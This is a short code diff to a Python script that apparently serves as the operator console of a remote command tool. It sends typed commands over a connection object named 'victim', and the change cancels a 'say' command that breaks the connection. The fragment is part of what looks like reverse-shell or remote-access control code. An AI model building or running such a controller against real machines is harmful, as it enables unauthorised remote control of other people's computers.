@@ -15,6 +15,9 @@ while True:
         command = input('Enter Command : ')
         if command == None:
             command = 'cd'
+        if command == 'say':
+            print('Command cancelled because the written command breaks connection.')
+            command = 'cd'
         command = command.encode()
         print(command)
         victim.send(command)
